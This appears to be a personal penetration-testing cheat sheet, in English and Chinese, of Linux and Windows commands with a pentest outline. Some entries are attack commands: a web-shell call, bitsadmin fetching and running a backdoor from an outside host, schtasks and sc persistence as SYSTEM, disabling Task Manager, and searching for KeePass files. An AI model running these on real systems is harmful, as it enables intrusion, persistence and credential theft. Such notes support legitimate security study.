# Foundation

## Linux

### find

```shell
touch root_auto_schedule.sh
sudo chown root root_auto_schedule.sh
sudo chmod o+w root_auto_schedule.sh
sudo find / -user root -type f -perm -o=w -iname '*.sh' 2>/dev/null
```

### ss

```shell
ss -aptu
```

### curl

```shell
curl http://192.168.176.11/project/uploads/users/254478-backdoor.php --data-urlencode "cmd=which nc"
```

## Windows

### cmd & powershell

#### get-childitem

```powershell
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
```

#### dir

```powershell
dir /a
dir /s *.exe /p
```

#### forfiles

```shell
forfiles /p c:\windows /s /m notepad.exe /c "cmd /s echo @path @fdate @ftime"
```

#### attrib

```shell
attrib -h local_hide.txt
```

#### icaacls

```shell
icacls local_hide.txt /grant Everyone:F
```

### reg

reg 是Windows命令行和脚本中用来操纵注册表的命令。reg 命令的全称是 "Registry Editor" 的缩写，它允许用户在命令行界面中执行注册表操作，如添加、修改、删除注册表键和值。

注册表是Windows操作系统中一个重要的数据库，存储了系统设置和配置信息，包括硬件、软件、用户偏好和系统设置等。通过 reg 命令，可以直接对注册表进行查询和更改，这对于系统管理和故障排除非常有用。

```shell
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg add "hkcu\software\microsoftware\windows\currentversion\policies\system" /v disabletaskmgr /t reg_dword /d "1" /f
```

### bitsadmin

bitsadmin是一个Windows命令行工具，用于管理后台智能传输服务（Background Intelligent Transfer Service，简称BITS）。BITS是一项Windows服务，允许文件在网络上以异步方式传输，通常用于在用户不注意的情况下传输文件，如Windows更新或其他应用程序的数据更新。

bitsadmin 工具提供了一系列的命令来创建、监视和控制BITS作业。作业是由一个或多个文件传输组成的，并且可以根据网络条件动态地调整速度，这样在网络使用率低的时候可以更快地传输数据，而在网络繁忙时则减慢速度，避免占用过多带宽。

```shell
bitsadmin /list /allusers /verbose
bitsadmin /info xxx /verbose

bitsadmin /create backdoor
bitsadmin /addfile backdoor "http://1.1.1.1/backdoor.exe" "c:\windows\temp\backdoor.exe"
bitsadmin /SetNotifyCmdLine backdoor "cmd.exe /c c:\windows\temp\backdoor.exe" NULL
bitsadmin /Setminretrydelay backdoor 1
bitsadmin /resume backdoor
```

### schtasks

schtasks 是Windows操作系统中用来创建、删除、查询、更改和运行系统任务计划的命令行工具。任务计划可以用来定时运行脚本或程序，执行系统维护任务，或者自动执行重复的作业。

```shell
schtasks /create /tn 任务名称 /tr 任务运行的命令 /sc 计划类型 /mo 修饰参数 /d 天 /st 开始时间 /ru 运行用户
```

```shell
schtasks /query /fo LIST /v
schtasks /create /tn "backdoor" /tr "c:\windows\temp\backdoor.exe" /sc minute /mo 1 /ru "system"
schtasks /run /tn "backdoor"
```

### sc

sc 是Windows操作系统中用来管理服务的命令行工具。sc 命令可以用来创建、删除、查询、更改和控制服务，如启动、停止、暂停和恢复服务。

```shell
sc query wsearch
sc qc wsearch
sc config wsearch binpath= "cmd.exe /c c:\windows\temp\backdoor.exe"
sc start wsearch
```

### SysinternalsSuit

- PsInfo64.exe /accepteula

## pentest process

A typical penetration test comprises the following stages:

- Defining the Scope
- Information Gathering
- Vulnerability Detection
- Initial Foothold
- Privilege Escalation
- Lateral Movement
- Reporting/Analysis
- Lessons Learned/Remediation

## 要点总结

- 全端口扫描（分段循环）
- 扫指纹（应用、版本、title、SNMP）
- 突破边界（GithubEXP、钓鱼邮件、PDF文件、CMS、枚举字典）
- WEB漏洞（SQLi、LFI、上传、RCE、遍历）
- 密码爆破（同密码、+1、用户名字典、密码喷射）
- 穿透内网（回连端口、正向侦听、busybox）
- 上传文件（FullTTY、WEB、SSH、SMB-“net use \\kali\share /user:kali kali”）
- 本地提权（PEAS、本地服务、pspy、分开编译、土豆）
- 域内移动（SPN、mimikatz、WMIC、WinRM、RDP）
- 本地信息收集（地点、应用名称）
